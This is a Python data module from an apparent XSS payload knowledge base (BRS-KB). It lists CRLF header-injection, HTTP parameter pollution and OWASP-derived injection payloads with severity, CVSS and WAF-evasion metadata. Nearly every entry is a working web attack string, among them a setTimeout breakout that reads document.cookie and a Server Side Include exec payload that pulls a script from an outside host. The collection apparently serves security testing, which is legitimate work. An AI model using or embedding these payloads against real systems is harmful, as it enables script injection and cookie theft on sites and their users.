#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Injection Technique Payloads
"""

from ..models import PayloadEntry


CRLF_XSS_PAYLOADS = {
    "crlf_1": PayloadEntry(
        payload="%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
        contexts=["url", "header"],
        severity="critical",
        cvss_score=8.5,
        description="CRLF injection with HTML response",
        tags=["crlf", "header", "injection"],
        waf_evasion=True,
        reliability="medium",
    ),
    "crlf_2": PayloadEntry(
        payload="%0d%0aLocation:javascript:alert(1)",
        contexts=["url", "header"],
        severity="high",
        cvss_score=7.5,
        description="CRLF Location header javascript",
        tags=["crlf", "header", "location"],
        waf_evasion=True,
        reliability="low",
    ),
    "crlf_3": PayloadEntry(
        payload="%0d%0aSet-Cookie:xss=<script>alert(1)</script>",
        contexts=["url", "header"],
        severity="high",
        cvss_score=7.5,
        description="CRLF Set-Cookie injection",
        tags=["crlf", "header", "cookie"],
        waf_evasion=True,
        reliability="low",
    ),
}

HPP_PAYLOADS = {
    "hpp_1": PayloadEntry(
        payload="?search=safe&search=<script>alert(1)</script>",
        contexts=["url"],
        severity="high",
        cvss_score=7.5,
        description="HPP duplicate parameter",
        tags=["hpp", "parameter", "pollution"],
        waf_evasion=True,
        reliability="medium",
    ),
    "hpp_2": PayloadEntry(
        payload="?search[]=safe&search[]=<script>alert(1)</script>",
        contexts=["url"],
        severity="high",
        cvss_score=7.5,
        description="HPP array parameter",
        tags=["hpp", "array", "pollution"],
        waf_evasion=True,
        reliability="medium",
    ),
    "hpp_3": PayloadEntry(
        payload="?search=safe%00<script>alert(1)</script>",
        contexts=["url"],
        severity="high",
        cvss_score=7.5,
        description="Null byte truncation",
        tags=["hpp", "null-byte", "truncation"],
        waf_evasion=True,
        reliability="low",
    ),
    # === OWASP Injection Payloads ===
    "owasp-ssi": PayloadEntry(
        payload="<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Server Side Includes XSS",
        tags=["owasp", "ssi", "command-injection"],
        reliability="low",
    ),
    "owasp-php-xss": PayloadEntry(
        payload="<? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="PHP code to generate XSS",
        tags=["owasp", "php", "server-side"],
        reliability="low",
    ),
    "owasp-hpp-xss": PayloadEntry(
        payload="This is a regular title&content_type=1;alert(1)",
        contexts=["javascript", "url"],
        severity="high",
        cvss_score=7.5,
        description="HTTP Parameter Pollution to XSS",
        tags=["owasp", "hpp", "parameter-pollution"],
        reliability="medium",
    ),
    "owasp-reflected-js-timeout": PayloadEntry(
        payload="500); alert(document.cookie);//",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Reflected XSS breaking out of setTimeout",
        tags=["owasp", "reflected", "javascript", "timeout"],
        reliability="high",
    ),
    "owasp-dom-eval": PayloadEntry(
        payload="document.cookie",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="DOM XSS payload for eval() context",
        tags=["owasp", "dom", "eval"],
        reliability="high",
    ),
    "owasp-js-include": PayloadEntry(
        payload="<BR SIZE=\"&{alert('XSS')}\">",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="JavaScript include via & notation - Netscape only",
        tags=["owasp", "legacy", "netscape"],
        reliability="low",
    ),
}

# Combined database
INJECTION_DATABASE = {
    **CRLF_XSS_PAYLOADS,
    **HPP_PAYLOADS,
}
INJECTION_TOTAL = len(INJECTION_DATABASE)
